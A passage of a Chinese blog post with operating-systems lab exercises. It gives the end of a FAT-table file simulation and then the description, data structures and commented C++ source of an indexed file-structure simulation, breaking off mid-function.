i++)<br>&#123;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">3</span>) &lt;&lt; i;<br><span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;FDF&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">if</span> (FAT[i] == <span class="hljs-number">-1</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;FFF&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">3</span>) &lt;&lt; FAT[i] &lt;&lt; endl;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">init</span>();<br><span class="hljs-type">int</span> op = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">while</span> (op)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;----------------------&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;1：存&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;2：插入&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;3：查看文件目录&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;4：查看FAT表&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;0：退出&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入操作：&quot;</span>;<br>cin &gt;&gt; op;<br>cout &lt;&lt; <span class="hljs-string">&quot;----------------------&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>)<br><span class="hljs-built_in">store</span>();<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">2</span>)<br><span class="hljs-built_in">ins</span>();<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">3</span>)<br><span class="hljs-built_in">disCatalog</span>();<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">4</span>)<br><span class="hljs-built_in">disFAT</span>();<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">0</span>)<br>cout &lt;&lt; <span class="hljs-string">&quot;程序结束！&quot;</span>;<br>cout &lt;&lt; <span class="hljs-string">&quot;----------------------&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="/2022/01/13/FileStructure/Users\yuhan\AppData\Roaming\Typora\typora-user-images\image-20211221112900663.png" alt="image-20211221112900663"><img src="/2022/01/13/FileStructure/Users\yuhan\AppData\Roaming\Typora\typora-user-images\image-20211221113135367.png" alt="image-20211221113135367"><img src="/2022/01/13/FileStructure/Users\yuhan\AppData\Roaming\Typora\typora-user-images\image-20211221113049802.png" alt="image-20211221113049802"></p><h2 id="第二题-模拟便于直接存取的索引文件结构"><a href="#第二题-模拟便于直接存取的索引文件结构" class="headerlink" title="第二题 模拟便于直接存取的索引文件结构"></a>第二题 模拟便于直接存取的索引文件结构</h2><h3 id="实验题目-1"><a href="#实验题目-1" class="headerlink" title="实验题目"></a>实验题目</h3><p>模拟便于直接存取的索引文件结构。</p><h4 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h4><p>（1）索引文件像链接文件一样，文件的逻辑记录信息可存放在非连续的磁盘存储空间中。但这些存放逻辑记录的存储空间不是按链表的形式链接在一起的，而是采用索引表来指出逻辑记录存放的物理位置。</p><p>文件目录与索引表的关系如下图所示：</p><p><img src="/2022/01/13/FileStructure/image-20211221113429122.png" alt="image-20211221113429122"></p><p>（2）建立索引文件的过程是：寻找一些空闲物理块；逻辑记录存入这些物理块中；把逻辑记录与物理块的对应关系登记在索引表中。</p><h3 id="程序中使用的数据结构及符号说明-1"><a href="#程序中使用的数据结构及符号说明-1" class="headerlink" title="程序中使用的数据结构及符号说明"></a>程序中使用的数据结构及符号说明</h3><ol><li><p>整型变量</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> rest = <span class="hljs-number">100000</span>;        <span class="hljs-comment">//磁盘剩余空间</span><br><span class="hljs-type">int</span> user_cnt = <span class="hljs-number">0</span>;         <span class="hljs-comment">//用户数量</span><br></code></pre></div></td></tr></table></figure></li><li><p>一维数组（数据结构）</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">bool</span> disk[<span class="hljs-number">100001</span>];        <span class="hljs-comment">//磁盘物理块 0 表示未被使用，1 表示已经被使用</span><br><span class="hljs-built_in">string</span> user[<span class="hljs-number">101</span>];         <span class="hljs-comment">//用户列表</span><br><span class="hljs-type">int</span> file_cnt[<span class="hljs-number">101</span>];        <span class="hljs-comment">//每个用户的文件数</span><br></code></pre></div></td></tr></table></figure></li><li><p>二维数组（数组结构）</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> block_cnt[<span class="hljs-number">101</span>][<span class="hljs-number">101</span>];  <span class="hljs-comment">//每个文件的块数量，用户 i 的第 j 个文件的块数量</span><br><span class="hljs-built_in">string</span> file[<span class="hljs-number">101</span>][<span class="hljs-number">101</span>];    <span class="hljs-comment">//文件名称，用户 i 的第 j 个文件的名称</span><br><span class="hljs-type">int</span> table[<span class="hljs-number">101</span>][<span class="hljs-number">101</span>][<span class="hljs-number">101</span>]; <span class="hljs-comment">//文件索引表，用户 i 的文件 j 的第 k 块的物理地址</span><br></code></pre></div></td></tr></table></figure></li><li><p>自定义函数</p><ul><li>void init()：初始化函数，重置磁盘和用户</li><li>int findUser(string username)：搜索用户列表，判断用户是否已经存在</li><li>int findFile(string username, string file_name)：搜索用户的文件列表，判断文件是否已经存在</li><li>void addUser()：创建新用户</li><li>void addFile()：添加新文件</li><li>void delFile()：删除文件</li><li>void delUser()：删除用户</li><li>void disUser()：查看用户列表</li><li>void disFile()：查看用户的文件目录</li><li>void disTable()：查看某个用户的某个文件的索引表</li></ul></li></ol><h3 id="源程序并附上注释-1"><a href="#源程序并附上注释-1" class="headerlink" title="源程序并附上注释"></a>源程序并附上注释</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iomanip&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-type">int</span> rest = <span class="hljs-number">100000</span>;        <span class="hljs-comment">//磁盘剩余空间</span><br><span class="hljs-type">int</span> user_cnt = <span class="hljs-number">0</span>;         <span class="hljs-comment">//用户数量</span><br><span class="hljs-type">bool</span> disk[<span class="hljs-number">100001</span>];        <span class="hljs-comment">//磁盘物理块 0 表示未被使用，1 表示已经被使用</span><br><span class="hljs-built_in">string</span> user[<span class="hljs-number">101</span>];         <span class="hljs-comment">//用户列表</span><br><span class="hljs-type">int</span> file_cnt[<span class="hljs-number">101</span>];        <span class="hljs-comment">//每个用户的文件数</span><br><span class="hljs-type">int</span> block_cnt[<span class="hljs-number">101</span>][<span class="hljs-number">101</span>];  <span class="hljs-comment">//每个文件的块数量，用户 i 的第 j 个文件的块数量</span><br><span class="hljs-built_in">string</span> file[<span class="hljs-number">101</span>][<span class="hljs-number">101</span>];    <span class="hljs-comment">//文件名称，用户 i 的第 j 个文件的名称</span><br><span class="hljs-type">int</span> table[<span class="hljs-number">101</span>][<span class="hljs-number">101</span>][<span class="hljs-number">101</span>]; <span class="hljs-comment">//文件索引表，用户 i 的文件 j 的第 k 块的物理地址</span><br><br><span class="hljs-comment">//初始化函数，重置磁盘和用户</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-comment">//所有磁盘标记为没有使用</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100001</span>; i++)<br>disk[i] = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//用户数量置为 0</span><br>user_cnt = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//输出提示信息</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;磁盘已重置&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-comment">//搜索用户列表，判断用户是否已经存在</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">findUser</span><span class="hljs-params">(<span class="hljs-built_in">string</span> username)</span><br>&#123;<br><span class="hljs-comment">//在用户列表当中搜索同名的用户</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= user_cnt; i++)<br><span class="hljs-keyword">if</span> (user[i] == username)<br><span class="hljs-keyword">return</span> i;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//搜索用户的文件列表，判断文件是否已经存在</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">findFile</span><span class="hljs-params">(<span class="hljs-built_in">string</span> username, <span class="hljs-built_in">string</span> file_name)</span><br>&#123;<br><span class="hljs-comment">//在某个用户的文件列表中搜索是否有这个文件存在</span><br><span class="hljs-type">int</span> usr = findUser(username);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= file_cnt[usr]; i++)<br><span class="hljs-keyword">if</span> (file[usr][i] == file_name)<br><span class="hljs-keyword">return</span> i;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//创建新用户</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">string</span> username;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入用户名称:&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; username;<br><span class="hljs-comment">//判断是否已经存在同名的用户</span><br><span class="hljs-keyword">if</span> (findUser(username) != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;该用户已存在，创建失败&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">//将这个用户存入用户列表</span><br>user[++user_cnt] = username;<br><span class="hljs-comment">//重置当前用户的文件数量</span><br>file_cnt[user_cnt] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;用户创建成功&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//添加新文件</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">addFile</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">string</span> username;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入要添加文件的用户名称:&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; username;<br><span class="hljs-comment">//判断是否有这个用户</span><br><span class="hljs-keyword">if</span> (findUser(username) == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;该用户不存在，文件添加失败&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-built_in">string</span> file_name;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入要添加的文件的名称:&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; file_name;<br><span class="hljs-comment">//判断该用户是否有同名的文件存在</span><br><span class="hljs-keyword">if</span> (findFile(username, file_name) != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;该用户已经存在同名文件，添加失败&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">int</span> len;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入文件的长度:&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; len;<br><span class="hljs-comment">//判断磁盘剩余空间是否够存储这个文件</span><br><span class="hljs-keyword">if</span> (len &gt; rest)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;磁盘空间不足，存储失败&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">//找到用户在用户列表中的位置</span><br><span class="hljs-type">int</span> user_pos = findUser(username);<br><span class="hljs-comment">//更新用户的文件数量</span><br>file_cnt[user_pos]++;<br><span class="hljs-comment">//将文件加入到用户文件列表中</span><br>file[user_pos][file_cnt[user_pos]] = file_name;<br><span class="hljs-comment">//更新这个文件占用的块数量</span><br>block_cnt[user_pos][file_cnt[user_pos]] = len;<br><span class="hljs-type">int</span> pos = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//占用磁盘资源</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= len; i++)<br>&#123;<br><span class="hljs-comment">//寻找一个空的磁盘块</span><br><span class="hljs-keyword">while</span> (disk[pos] != <span class="hljs-number">0</span>)<br>pos++;<br><span class="hljs-comment">//占用这个磁盘块</span><br>disk[pos] = <span class="hljs-number">1</span>;<br><span class="hljs-comment">//记录索引表和磁盘间的映射关系</span><br>table[user_pos][file_cnt[user_pos]][i] = pos;<br><span class="hljs-comment">//更新剩余磁盘剩余块的数量</span><br>rest--;<br>&#125;<br><span class="hljs-comment">//输出成功信息</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;文件存储成功&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-comment">//删除文件</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">delFile</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">string</span> username;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入要删除的文件所属的用户:&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; username;<br><span class="hljs-comment">//寻找是否有这个用户</span><br><span class="hljs-keyword">if</span> (findUser(username) == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;没有这个用户，删除失败&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-built_in">string</span> file_name;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入要删除的文件名称:&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; file_name;<br><span class="hljs-comment">//寻找是否有要删除的文件</span><br><span class="hljs-keyword">if</span> (findFile(username, file_name) == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;没有这个文件，删除失败&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">//记录用户在用户表中的位置</span><br><span class="hljs-type">int</span> user_pos = findUser(username);<br><span class="hljs-comment">//记录文件在文件目录中的位置</span><br><span class="hljs-type">int</span> file_pos = findFile(username, file_name);<br><span class="hljs-comment">//释放这个文件占用的磁盘资源</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= block_cnt[user_pos][file_pos]; i++)<br>&#123;<br>disk[table[user_pos][file_pos][i]] = <span class="hljs-number">0</span>;<br>rest++;<br>&#125;<br><span class="hljs-comment">//清空文件索引表中这个文件的记录</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = file_pos; i &lt; file_cnt[user_pos]; i++)<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= block_cnt[user_pos][i + <span class="hljs-number">1</span>]; j++)<br>table[user_pos][i][j] = table[user_pos][i + <span class="hljs-number">1</span>][j]; <span class="hljs-comment">//清空这个文件的块数量记录</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = file_pos; i &lt; file_cnt[user_pos]; i++)<br>block_cnt[user_pos][i] = block_cnt[user_pos][i + <span class="hljs-number">1</span>];<br><span class="hljs-comment">//在文件目录中删除这个文件</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = file_pos; i &lt; file_cnt[user_pos]; i++)<br>file[user_pos][i] = file[user_pos][i + <span class="hljs-number">1</span>];<br><span class="hljs-comment">//文件数量减一</span><br>file_cnt[user_pos]--;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;文件删除成功&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-comment">//删除用户</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">delUser</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">string</span> username;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入要删除的用户名称:&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; username;<br><span class="hljs-type">int</span> user_pos = findUser(username);<br><span class="hljs-keyword">if</span> (user_pos == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;没有这个用户，删除失败&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">//释放这个用户占用的所有磁盘资源</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= file_cnt[user_pos]; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= block_cnt[user_pos][i]; j++)<br>&#123;<br>disk[table[user_pos][i][j]] = <span class="hljs-number">0</span>;<br>rest++;<br>&#125;<br>&#125;<br><span class="hljs-comment">//删除这个用户所有文件的块映射记录</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = user_pos; i &lt; user_cnt; i++)<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= file_cnt[i + <span class="hljs-number">1</span>]; j++)<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; k &lt;= block_cnt[i + <span class="hljs-number">1</span>][j]; k++)<br>table[i][j][k] = table[i + <span class="hljs-number">1</span>][j][k];<br><span class="hljs-comment">//删除这个用户的文件目录</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = user_pos; i &lt; user_cnt; i++)<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= file_cnt[i + <span class="hljs-number">1</span>]; j++)<br>file[i][j] = file[i + <span class="hljs-number">1</span>][j];<br><span class="hljs-comment">//删除这个用户的每个文件的块数量</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = user_pos; i &lt; user_cnt; i++)<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= file_cnt[i + <span class="hljs-number">1</span>]; j++)<br>block_cnt[i][j] = block_cnt[i + <span class="hljs-number">1</span>][j];<br><span class="hljs-comment">//用户文件数量中删除这个用户的记录</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = user_pos; i &lt; user_cnt; i++)<br>file_cnt[i] = file_cnt[i + <span class="hljs-number">1</span>];<br><span class="hljs-comment">//在用户列表里面删除这个用户的记录</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = user_pos; i &lt; user_cnt; i++)<br>user[i] = user[i + <span class="hljs-number">1</span>];<br><span class="hljs-comment">//更新删除以后的用户数量</span><br>user_cnt--;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;用户删除成功&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-comment">//查看用户列表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">disUser</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;用户列表如下：&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;| 用户名 | 文件目录地址 |&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= user_cnt; i++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;| &quot;</span> &lt;&lt; setw(<span class="hljs-number">6</span>) &lt;&lt; user[i] &lt;&lt; <span class="hljs-string">&quot; |     &quot;</span> &lt;&lt; setw(<span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">100</span> * (i - <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-string">&quot;     |&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//查看用户的文件目录</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">disFile</span><span 